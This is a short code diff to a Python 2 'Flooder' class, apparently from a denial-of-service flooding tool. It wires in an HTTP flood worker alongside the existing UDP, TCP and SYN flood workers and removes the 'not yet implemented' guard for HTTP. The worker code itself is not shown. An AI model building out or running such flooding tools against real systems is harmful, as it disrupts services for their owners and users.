@@ -4,6 +4,7 @@ from main import *
 from UDPWorkerThread import *
 from TCPWorkerThread import *
 from SYNWorkerThread import *
+from HTTPWorkerThread import *
 import synmod
 
 class Flooder:
@@ -31,9 +32,6 @@ class Flooder:
                 return
         elif method == SYN_METHOD:
             synmod.init(srchost, srcport, host, port)
-        if method == HTTP_METHOD:
-            print "Not yet implemented, not starting."
-            return
 
     def start(self):
         if len(self.__processes) > 0:
@@ -47,6 +45,8 @@ class Flooder:
 	            p = UDPWorkerThread(self, self.threadId)
             elif self.method == SYN_METHOD:
 	            p = SYNWorkerThread(self, self.threadId)
+            elif self.method == HTTP_METHOD:
+	            p = HTTPWorkerThread(self, self.threadId)
             self.threadId += 1
             self.__processes.append(p)
             p.start()
